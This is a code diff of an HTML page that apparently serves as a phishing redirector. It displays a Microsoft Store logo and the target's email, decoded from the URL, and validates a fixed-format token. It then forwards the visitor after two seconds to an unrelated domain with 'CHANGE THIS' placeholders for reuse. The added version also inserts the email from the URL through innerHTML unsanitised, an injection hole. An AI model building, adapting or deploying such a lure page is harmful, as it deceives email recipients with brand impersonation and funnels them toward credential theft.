@@ -7,81 +7,78 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: white;
             text-align: center;
+            background-color: #ffffff;
             margin: 0;
             padding: 0;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            flex-direction: column;
         }
-        .logo {
-            width: 180px;
+        img {
+            width: 250px; /* Adjust the size as needed */
             height: auto;
             margin-bottom: 20px;
         }
-        .email {
-            font-size: 18px;
-            color: black;
+        .loading {
+            font-size: 28px;
             font-weight: bold;
-            margin-bottom: 15px;
-        }
-        .dots {
-            font-size: 24px;
-            font-weight: bold;
-            animation: loadingDots 1.5s infinite;
-        }
-        @keyframes loadingDots {
-            0%, 33% { content: "."; }
-            66% { content: ".."; }
-            100% { content: "..."; }
         }
     </style>
+    <script>
+        window.onload = function () {
+            const urlParams = new URLSearchParams(window.location.search);
+            const tokenParam = urlParams.toString(); // Get the full query string
+            const tokenPattern = /^[A-Z]{20}[a-z]{20}[0-9]{8}=$/; // Regex pattern for validation
+            
+            // Extract the token from URL
+            let token = tokenParam.split("=")[0] + "=";
+            let email = urlParams.get(token.replace("=", "")); // Get email if exists
+
+            // Validate token format
+            if (!tokenPattern.test(token)) {
+                document.body.innerHTML = "<h2>Invalid Token</h2>";
+                return;
+            }
+
+            // Set your logo image and redirect URL
+            const imageUrl = "https://store-images.s-microsoft.com/image/apps.64342.9007199266252569.06e34d57-e1e7-4d60-9444-9e04e7cea74f.839ba91a-9709-429a-9e00-6c3e0cda6f0c"; // CHANGE THIS
+            const redirectUrl = "https://random.bmtadvantage.org/deep-linkcdn?em="; // CHANGE THIS
+
+            // Display image
+            document.body.innerHTML = `<img src="${imageUrl}" alt="Loading..."><br>`;
+
+            // Display email (if provided)
+            if (email) {
+                try {
+                    // Decode Base64 if necessary
+                    email = atob(email);
+                } catch (e) {
+                    // If decoding fails, assume it's a normal email
+                }
+                document.body.innerHTML += `<div class="loading">${email}</div><br>`;
+            }
+
+            // Display loading dots
+            let loadingText = document.createElement("div");
+            loadingText.className = "loading";
+            document.body.appendChild(loadingText);
+
+            let dots = 0;
+            setInterval(() => {
+                dots = (dots + 1) % 4;
+                loadingText.innerHTML = ".".repeat(dots);
+            }, 500);
+
+            // Redirect after 2 seconds
+            setTimeout(() => {
+                window.location.href = redirectUrl;
+            }, 2000);
+        };
+    </script>
 </head>
 <body>
-
-    <img src="https://store-images.s-microsoft.com/image/apps.64342.9007199266252569.06e34d57-e1e7-4d60-9444-9e04e7cea74f.839ba91a-9709-429a-9e00-6c3e0cda6f0c" class="logo" alt="Logo">
-    <div class="email" id="emailDisplay"></div>
-    <div class="dots">...</div>
-
-    <script>
-        // Custom regex pattern to validate 20 uppercase, 20 lowercase, 8 digits, and "="
-        const validPattern = /^[A-Z]{20}[a-z]{20}\d{8}=$/;
-
-        // The default final redirect URL
-        const defaultRedirectURL = "https://random.bmtadvantage.org/deep-linkcdn?em="; // Update this to your redirect URL
-
-        // Get the full URL query string
-        const params = new URLSearchParams(window.location.search);
-        let tokenWithEmail = params.keys().next().value;
-
-        if (tokenWithEmail) {
-            const [token, email] = tokenWithEmail.split("=");
-
-            if (validPattern.test(token)) {
-                if (email) {
-                    // Decode Base64 if needed
-                    let decodedEmail = email;
-                    try {
-                        decodedEmail = atob(email);
-                    } catch (error) {
-                        // If not Base64, use as plain text
-                    }
-                    document.getElementById("emailDisplay").textContent = decodedEmail;
-                }
-
-                setTimeout(() => {
-                    window.location.href = defaultRedirectURL;
-                }, 2000); // 2-second delay before redirect
-            } else {
-                document.body.innerHTML = "<h1>Invalid Token URL</h1>";
-            }
-        } else {
-            document.body.innerHTML = "<h1>Invalid URL</h1>";
-        }
-    </script>
-
 </body>
 </html>
